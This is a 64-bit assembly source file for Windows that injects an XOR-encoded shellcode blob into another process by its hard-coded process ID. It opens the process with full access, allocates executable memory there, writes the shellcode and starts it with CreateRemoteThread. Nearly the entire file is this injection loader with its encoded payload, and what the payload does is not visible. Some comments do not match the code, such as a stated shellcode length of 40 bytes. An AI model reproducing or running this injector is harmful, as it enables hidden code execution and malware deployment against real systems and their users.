[BITS 64]

section .data
	
	shellcode 	db 0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x5b, 0xbf, 0xe0, 0x94, 0x5d, 0x44, 0x7b, 0xbc, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xa7, 0xf7, 0x63, 0x70, 0xad, 0xac, 0xbb, 0xbc, 0x5b, 0xbf, 0xa1, 0xc5, 0x1c, 0x14, 0x29, 0xed, 0x0d, 0xf7, 0xd1, 0x46, 0x38, 0x0c, 0xf0, 0xee, 0x3b, 0xf7, 0x6b, 0xc6, 0x45, 0x0c, 0xf0, 0xee, 0x7b, 0xf7, 0x6b, 0xe6, 0x0d, 0x0c, 0x74, 0x0b, 0x11, 0xf5, 0xad, 0xa5, 0x94, 0x0c, 0x4a, 0x7c, 0xf7, 0x83, 0x81, 0xe8, 0x5f, 0x68, 0x5b, 0xfd, 0x9a, 0x76, 0xed, 0xd5, 0x5c, 0x85, 0x99, 0x51, 0x09, 0xfe, 0xb1, 0xdc, 0xd6, 0x16, 0x5b, 0x37, 0x19, 0x83, 0xa8, 0x95, 0x8d, 0xcf, 0xfb, 0x34, 0x5b, 0xbf, 0xe0, 0xdc, 0xd8, 0x84, 0x0f, 0xdb, 0x13, 0xbe, 0x30, 0xc4, 0xd6, 0x0c, 0x63, 0xf8, 0xd0, 0xff, 0xc0, 0xdd, 0x5c, 0x94, 0x98, 0xea, 0x13, 0x40, 0x29, 0xd5, 0xd6, 0x70, 0xf3, 0xf4, 0x5a, 0x69, 0xad, 0xa5, 0x94, 0x0c, 0x4a, 0x7c, 0xf7, 0xfe, 0x21, 0x5d, 0x50, 0x05, 0x7a, 0x7d, 0x63, 0x5f, 0x95, 0x65, 0x11, 0x47, 0x37, 0x98, 0x53, 0xfa, 0xd9, 0x45, 0x28, 0x9c, 0x23, 0xf8, 0xd0, 0xff, 0xc4, 0xdd, 0x5c, 0x94, 0x1d, 0xfd, 0xd0, 0xb3, 0xa8, 0xd0, 0xd6, 0x04, 0x67, 0xf5, 0x5a, 0x6f, 0xa1, 0x1f, 0x59, 0xcc, 0x33, 0xbd, 0x8b, 0xfe, 0xb8, 0xd5, 0x05, 0x1a, 0x22, 0xe6, 0x1a, 0xe7, 0xa1, 0xcd, 0x1c, 0x1e, 0x33, 0x3f, 0xb7, 0x9f, 0xa1, 0xc6, 0xa2, 0xa4, 0x23, 0xfd, 0x02, 0xe5, 0xa8, 0x1f, 0x4f, 0xad, 0x2c, 0x43, 0xa4, 0x40, 0xbd, 0xdc, 0xe7, 0x45, 0x7b, 0xbc, 0x5b, 0xbf, 0xe0, 0x94, 0x5d, 0x0c, 0xf6, 0x31, 0x5a, 0xbe, 0xe0, 0x94, 0x1c, 0xfe, 0x4a, 0x37, 0x34, 0x38, 0x1f, 0x41, 0xe6, 0xb4, 0xce, 0x1e, 0x0d, 0xfe, 0x5a, 0x32, 0xc8, 0xf9, 0xe6, 0x43, 0x8e, 0xf7, 0x63, 0x50, 0x75, 0x78, 0x7d, 0xc0, 0x51, 0x3f, 0x1b, 0x74, 0x28, 0x41, 0xc0, 0xfb, 0x48, 0xcd, 0x8f, 0xfe, 0x5d, 0x1d, 0x3a, 0x35, 0x81, 0x40, 0x35, 0xf7, 0x3c, 0x28, 0x18, 0x92, 0x3e, 0xc7, 0x85, 0x94, 0x5d, 0x44, 0x7b, 0xbc
	; shellcode length is 40 bytes

section .text

	global _start

extern OpenProcess
extern VirtualAllocEx
extern WriteProcessMemory
extern CreateRemoteThread
extern WaitForSingleObject
extern CloseHandle
extern VirtualFreeEx
extern ExitProcess

_start:
	push rsp
	mov rbp, rsp
	sub rsp, 0x60

; 1) Get a handle to the remote process
	xor r8, r8
	mov rdx, r8							; 0 (FALSE)
	mov rcx, r8
	mov rcx, 0x1fffff						; PROCESS_ALL_ACCESS
	add r8, 5068							; DWORD processID
	call OpenProcess						; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5068)
	mov r14, rax							; storing the handle (hProcess) into r14
	
; 2) allocate 0x400 bytes of memory in the target process
	xor rdx, rdx
	mov DWORD [ss:rsp+0x20], 0x40					; PAGE_EXECUTE_READWRITE (5th arg goes on the stack)
	mov r9, 0x1000							; MEM_COMMIT
	mov r8, 0x400							; dwSize
	mov rcx, rax							; hProcess
	mov rax, QWORD [ds:VirtualAllocEx]
	call rax							; VirtualAllocEx(hProcess, 0, MEM_COMMIT, PAGE_READWRITE_EXECUTE)
	mov r13, rax							; storing the allocation base into r13
	

; 3) Write shellcode into the remote process
	xor rcx, rcx
	mov QWORD [ss:rsp+0x20], rcx					; dwBytesWritten (5th arg goes on the stack)
	mov rcx, r14							; hProcess
	mov rdx, r13							; base of the new remote memory region (allocate)
	lea r8, [shellcode]						; LPCVOID shellcode
	mov r9, 0x400 							; sizeof(allocate)
	mov rax, QWORD [ds:WriteProcessMemory]
	call rax							; WriteProcessMemory(hProcess, allocate, shellcode, 0x400, NULL)


; 4) Execute shellcode by creating a new thread
	mov rcx, r14							; hProcess
	xor rdx, rdx							; 0
	mov r8, rdx							; 0
	mov r9, r13							; allocate
	mov QWORD [ss:rsp+0x20], rdx					; 0
	mov QWORD [ss:rsp+0x28], rdx					; 0
	mov QWORD [ss:rsp+0x30], rdx					; 0
	mov rax, QWORD [ds:CreateRemoteThread]
	call rax							; CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)allocate, 0, 0, 0)
	
	cmp rax, 0
	jz _free_memory							; if CreateRemoteThread fails then jump to _free_memory, otherwise...

	mov r15, rax							; ...store remote thread handle into r15
	mov rcx, rax							; hThread
	mov rdx, 0xFFFFFFFF						; INFINITE
	mov rax, QWORD [ds:WaitForSingleObject]
	call rax							; WaitForSingleObject(hThread, INFINITE)
									; if success...
	mov rcx, r15
	call _close_handle						; ...close out hThread...
	mov rcx, r14
	call _close_handle						; ...and hProcess
	jmp _exit							; go to _exit


_close_handle:
	mov rax, QWORD [ds:CloseHandle]
	call rax
	ret
	

_free_memory:
	mov rcx, r14							; hProcess
	mov rdx, r13							; allocate
	mov r8, 0x100							; sizeof(allocate)
	mov r9, 0x00004000						; MEM_DECOMMIT
	mov rax, QWORD [ds:VirtualFreeEx]
	call rax							; VirtualFreeEx(hProcess, allocate, sizeof(allocate), MEM_DECOMMIT)
	jmp _exit


_exit:
	xor rcx, rcx
	mov rax, QWORD [ds:ExitProcess]
	call rax							; ExitProcess(0)